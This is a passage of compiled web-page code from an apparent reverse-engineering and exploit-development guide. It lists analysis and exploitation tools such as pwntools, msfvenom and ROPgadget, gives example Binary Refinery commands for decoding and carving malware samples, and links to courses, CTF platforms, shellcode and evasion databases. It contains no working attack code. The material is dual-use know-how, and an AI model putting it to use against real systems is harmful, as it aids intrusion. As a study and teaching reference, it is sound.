framework"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Pin"})}),(0,i.jsx)(n.td,{children:"Win/Linux"}),(0,i.jsx)(n.td,{children:"Intel's instrumentation tool"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Unicorn"})}),(0,i.jsx)(n.td,{children:"All"}),(0,i.jsx)(n.td,{children:"CPU emulator for RE (based on QEMU)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Qiling"})}),(0,i.jsx)(n.td,{children:"All"}),(0,i.jsx)(n.td,{children:"Binary emulation framework"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"platform-specific-tools",children:"Platform-Specific Tools"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Windows:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"PE-bear:"})," PE editor/analyzer"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"PEview:"})," PE structure viewer"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"CFF Explorer:"})," PE editor"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Process Hacker:"})," Process monitoring"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Procmon:"})," File/registry/network monitoring"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Linux:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"readelf:"})," ELF header analysis"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"objdump:"})," Disassembler"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ltrace:"})," Library call tracer"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"strace:"})," System call tracer"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ldd:"})," List dynamic dependencies"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:".NET:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"dnSpy:"})," Decompiler + debugger"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ILSpy:"})," Decompiler"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"dotPeek:"})," Decompiler (JetBrains)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"de4dot:"})," Deobfuscator"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Android:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"JADX:"})," DEX to Java decompiler"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Apktool:"})," APK decoder/builder"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"dex2jar:"})," DEX to JAR converter"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"JD-GUI:"})," Java decompiler"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Frida:"})," Dynamic instrumentation"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"exploit-development-1",children:"Exploit Development"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"pwntools"})}),(0,i.jsx)(n.td,{children:"Python exploit framework"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"ROPgadget"})}),(0,i.jsx)(n.td,{children:"ROP gadget finder"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"ropper"})}),(0,i.jsx)(n.td,{children:"ROP gadget finder (more features)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"msfvenom"})}),(0,i.jsx)(n.td,{children:"Shellcode generator (Metasploit)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"one_gadget"})}),(0,i.jsx)(n.td,{children:"Find one-shot RCE gadgets in libc"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"pwndbg/GEF/PEDA"})}),(0,i.jsx)(n.td,{children:"GDB enhancements for exploit dev"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"utilities",children:"Utilities"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"HxD"})}),(0,i.jsx)(n.td,{children:"Hex editor (Windows)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"010 Editor"})}),(0,i.jsx)(n.td,{children:"Hex editor with templates"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Detect It Easy"})}),(0,i.jsx)(n.td,{children:"Packer/compiler detection"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Entropy"})}),(0,i.jsx)(n.td,{children:"Measure file entropy (detect packing)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"UPX"})}),(0,i.jsx)(n.td,{children:"Packer/unpacker"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"PEiD"})}),(0,i.jsx)(n.td,{children:"Packer/compiler detection (legacy)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Binary Refinery"})}),(0,i.jsx)(n.td,{children:"Python-based binary analysis toolkit with 100+ tools for data extraction, deobfuscation, and format parsing"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Binary Refinery usage:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Install Binary Refinery:\npip install binary-refinery\n\n# Extract strings from binary:\nemit malware.exe | carve string | peek\n\n# Decode XOR-encoded data:\nemit encoded.bin | xor key:0x42 | peek\n\n# Extract embedded PE files:\nemit packed.exe | carve pe | dump\n\n# Chain multiple operations:\nemit data.bin | xor key:0x13 | zl | carve url | peek\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"learning-resources",children:"Learning Resources"}),"\n",(0,i.jsx)(n.h3,{id:"books",children:"Books"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Practical Reverse Engineering"})," by Bruce Dang et al. (x86/x64/ARM reversing)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"The IDA Pro Book"})," by Chris Eagle (IDA Pro deep dive)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Reversing: Secrets of Reverse Engineering"})," by Eldad Eilam (fundamentals)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"The Art of Software Security Assessment"})," by Mark Dowd et al. (vulnerability research)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Hacking: The Art of Exploitation"})," by Jon Erickson (exploit development)"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"practice-platforms",children:"Practice Platforms"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Crackmes.one:"})," ",(0,i.jsx)(n.a,{href:"https://crackmes.one/",children:"https://crackmes.one/"})," (reversing challenges)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ReverseEngineering.StackExchange:"})," ",(0,i.jsx)(n.a,{href:"https://reverseengineering.stackexchange.com/",children:"https://reverseengineering.stackexchange.com/"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"CTFtime:"})," ",(0,i.jsx)(n.a,{href:"https://ctftime.org/",children:"https://ctftime.org/"})," (CTF competitions with RE challenges)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"PicoCTF:"})," ",(0,i.jsx)(n.a,{href:"https://picoctf.org/",children:"https://picoctf.org/"})," (beginner-friendly CTF)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"HackTheBox:"})," ",(0,i.jsx)(n.a,{href:"https://www.hackthebox.eu/",children:"https://www.hackthebox.eu/"})," (reversing & exploitation)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Pwnable.kr / Pwnable.tw:"})," (binary exploitation practice)"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"online-courses",children:"Online Courses"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Malware Analysis Bootcamp (SANS FOR610)"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Reverse Engineering Malware (SANS FOR610)"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Practical Malware Analysis & Triage (PMAT)"})," by TCM Security"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"LiveOverflow YouTube:"})," ",(0,i.jsx)(n.a,{href:"https://www.youtube.com/c/LiveOverflow",children:"https://www.youtube.com/c/LiveOverflow"})," (binary exploitation)"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"reference-resources",children:"Reference Resources"}),"\n",(0,i.jsx)(n.h3,{id:"comprehensive-knowledge-bases",children:"Comprehensive Knowledge Bases"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"HackTricks - Binary Exploitation"})," - ",(0,i.jsx)(n.a,{href:"https://book.hacktricks.xyz/binary-exploitation",children:"book.hacktricks.xyz/binary-exploitation"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Stack/heap overflows, ROP, format strings"}),"\n",(0,i.jsx)(n.li,{children:"Linux and Windows exploit techniques"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Nightmare (Binary Exploitation)"})," - ",(0,i.jsx)(n.a,{href:"https://guyinatuxedo.github.io/",children:"guyinatuxedo.github.io"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Comprehensive CTF binary exploitation course"}),"\n",(0,i.jsx)(n.li,{children:"Covers stack overflows, ROP, heap exploitation, kernel exploitation"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Reverse Engineering for Beginners"})," - ",(0,i.jsx)(n.a,{href:"https://beginners.re/",children:"beginners.re"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Free book by Dennis Yurichev"}),"\n",(0,i.jsx)(n.li,{children:"Covers x86/ARM assembly, disassembly, patterns"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Malware Unicorn's Reverse Engineering 101"})," - ",(0,i.jsx)(n.a,{href:"https://malwareunicorn.org/workshops/re101.html",children:"malwareunicorn.org/workshops/re101.html"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Beginner-friendly RE workshop materials"}),"\n",(0,i.jsx)(n.li,{children:"x86 assembly, IDA Pro, malware analysis"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"assembly--architecture-resources",children:"Assembly & Architecture Resources"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"x86 Assembly Guide (UVA)"})," - ",(0,i.jsx)(n.a,{href:"https://www.cs.virginia.edu/~evans/cs216/guides/x86.html",children:"cs.virginia.edu/~evans/cs216/guides/x86.html"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"x86 assembly reference and calling conventions"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Intel Software Developer Manuals"})," - ",(0,i.jsx)(n.a,{href:"https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html",children:"intel.com/sdm"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official x86/x64 instruction set reference"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ARM Architecture Reference Manual"})," - ",(0,i.jsx)(n.a,{href:"https://developer.arm.com/documentation/",children:"developer.arm.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official ARM instruction set documentation"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Agner Fog's Optimization Manuals"})," - ",(0,i.jsx)(n.a,{href:"https://www.agner.org/optimize/",children:"agner.org/optimize"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"x86 assembly optimization and microarchitecture guides"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"tool-documentation",children:"Tool Documentation"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Ghidra Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://ghidra-sre.org/",children:"ghidra-sre.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official Ghidra user guide and scripting reference"}),"\n",(0,i.jsx)(n.li,{children:"P-Code (Ghidra's intermediate language) documentation"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"IDA Pro Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://hex-rays.com/documentation/",children:"hex-rays.com/documentation"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"IDA Pro and Hex-Rays decompiler manuals"}),"\n",(0,i.jsx)(n.li,{children:"IDAPython API reference"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Binary Ninja Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://docs.binary.ninja/",children:"docs.binary.ninja"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Binary Ninja Python API and BNIL documentation"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Radare2 Book"})," - ",(0,i.jsx)(n.a,{href:"https://book.rada.re/",children:"book.rada.re"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Comprehensive radare2 guide"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"x64dbg Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://help.x64dbg.com/",children:"help.x64dbg.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"x64dbg debugger reference"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"binary-formats",children:"Binary Formats"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Portable Executable (PE) Format"})," - ",(0,i.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/debug/pe-format",children:"docs.microsoft.com/en-us/windows/win32/debug/pe-format"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official Microsoft PE format specification"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ELF Format Specification"})," - ",(0,i.jsx)(n.a,{href:"https://refspecs.linuxbase.org/elf/elf.pdf",children:"refspecs.linuxbase.org/elf/elf.pdf"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official ELF (Linux/Unix) format specification"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Mach-O Format (macOS)"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/aidansteele/osx-abi-macho-file-format-reference",children:"github.com/aidansteele/osx-abi-macho-file-format-reference"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Apple Mach-O executable format reference"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"exploit-development-resources",children:"Exploit Development Resources"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Exploit Education"})," - ",(0,i.jsx)(n.a,{href:"https://exploit.education/",children:"exploit.education"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Phoenix, Nebula, Fusion VM challenges"}),"\n",(0,i.jsx)(n.li,{children:"Hands-on binary exploitation practice"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ROP Emporium"})," - ",(0,i.jsx)(n.a,{href:"https://ropemporium.com/",children:"ropemporium.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"ROP (Return-Oriented Programming) challenges"}),"\n",(0,i.jsx)(n.li,{children:"Progressively difficult exploit development exercises"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"pwn.college"})," - ",(0,i.jsx)(n.a,{href:"https://pwn.college/",children:"pwn.college"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Arizona State University's binary exploitation course"}),"\n",(0,i.jsx)(n.li,{children:"Covers assembly, shellcode, ROP, heap exploitation"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"how2heap"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/shellphish/how2heap",children:"github.com/shellphish/how2heap"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Heap exploitation techniques and examples"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Shellcode Database"})," - ",(0,i.jsx)(n.a,{href:"http://shell-storm.org/shellcode/",children:"shell-storm.org/shellcode"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Collection of shellcode for various architectures"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"cheat-sheets--quick-references",children:"Cheat Sheets & Quick References"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"x86/x64 Opcode Reference"})," - ",(0,i.jsx)(n.a,{href:"http://ref.x86asm.net/",children:"ref.x86asm.net"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Quick x86 instruction reference"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Syscall Tables"})," - ",(0,i.jsx)(n.a,{href:"https://syscalls.w3challs.com/",children:"syscalls.w3challs.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Linux/Windows syscall numbers and arguments"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"GTFOBins"})," - ",(0,i.jsx)(n.a,{href:"https://gtfobins.github.io/",children:"gtfobins.github.io"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Unix binary exploitation techniques (sudo, SUID, capabilities)"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"LOLBAS Project"})," - ",(0,i.jsx)(n.a,{href:"https://lolbas-project.github.io/",children:"lolbas-project.github.io"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Living Off the Land Binaries (Windows exploitation)"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Calling Conventions Cheat Sheet"})," - ",(0,i.jsx)(n.a,{href:"https://www.agner.org/optimize/calling_conventions.pdf",children:"agner.org/optimize/calling_conventions.pdf"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"x86/x64 calling convention reference"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"disassembly-patterns--idioms",children:"Disassembly Patterns & Idioms"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Hex-Rays Microcode Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://hex-rays.com/products/ida/support/idapython_docs/",children:"hex-rays.com/products/ida/support/idapython_docs/"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Understanding Hex-Rays decompiler internals"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Binary Ninja IL Reference"})," - ",(0,i.jsx)(n.a,{href:"https://docs.binary.ninja/dev/bnil-overview.html",children:"docs.binary.ninja/dev/bnil-overview.html"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Understanding Binary Ninja's intermediate languages"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Compiler Explorer (Godbolt)"})," - ",(0,i.jsx)(n.a,{href:"https://godbolt.org/",children:"godbolt.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"See how C/C++ compiles to assembly for various compilers"}),"\n",(0,i.jsx)(n.li,{children:"Understand compiler optimizations and patterns"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"anti-reversing--obfuscation",children:"Anti-Reversing & Obfuscation"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Awesome Reverse Engineering - Anti-Debugging"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/wtsxDev/reverse-engineering",children:"github.com/wtsxDev/reverse-engineering"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Collection of anti-debugging techniques"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"The Ultimate Anti-Reversing Reference"})," - ",(0,i.jsx)(n.a,{href:"http://www.anti-reversing.com/",children:"anti-reversing.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Comprehensive anti-RE techniques catalog"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Unprotect Project"})," - ",(0,i.jsx)(n.a,{href:"https://unprotect.it/",children:"unprotect.it"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Malware evasion techniques database"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"practice-platforms-1",children:"Practice Platforms"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Crackmes.one"})," - ",(0,i.jsx)(n.a,{href:"https://crackmes.one/",children:"crackmes.one"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Community crackme challenges (all difficulty levels)"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Reverse Engineering StackExchange"})," - ",(0,i.jsx)(n.a,{href:"https://reverseengineering.stackexchange.com/",children:"reverseengineering.stackexchange.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Q&A forum for reverse engineering"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"PicoCTF"})," - ",(0,i.jsx)(n.a,{href:"https://picoctf.org/",children:"picoctf.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Beginner-friendly CTF with RE challenges"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Pwnable.kr"})," - ",(0,i.jsx)(n.a,{href:"http://pwnable.kr/",children:"pwnable.kr"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Korean wargame with binary exploitation challenges"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Pwnable.tw"})," - ",(0,i.jsx)(n.a,{href:"https://pwnable.tw/",children:"pwnable.tw"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Taiwan wargame with advanced exploitation challenges"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"HackTheBox"})," - ",(0,i.jsx)(n.a,{href:"https://www.hackthebox.com/",children:"hackthebox.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Reversing and binary exploitation boxes"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"ctf-write-ups--solutions",children:"CTF Write-ups & Solutions"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"CTFtime Write-ups"})," - ",(0,i.jsx)(n.a,{href:"https://ctftime.org/writeups",children:"ctftime.org/writeups"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"CTF solutions database (search for RE challenges)"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Google CTF Write-ups"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/google/google-ctf",children:"github.com/google/google-ctf"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official Google CTF challenge write-ups"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"LiveOverflow YouTube"})," - ",(0,i.jsx)(n.a,{href:"https://www.youtube.com/c/LiveOverflow",children:"youtube.com/c/LiveOverflow"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Binary exploitation and RE video tutorials"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"blogs--research",children:"Blogs & Research"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Trail of Bits Blog"})," - ",(0,i.jsx)(n.a,{href:"https://blog.trailofbits.com/",children:"blog.trailofbits.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Security research and reverse engineering articles"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"RET2 Systems Blog"})," - ",(0,i.jsx)(n.a,{href:"https://blog.ret2.io/",children:"blog.ret2.io"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Vulnerability research and exploit 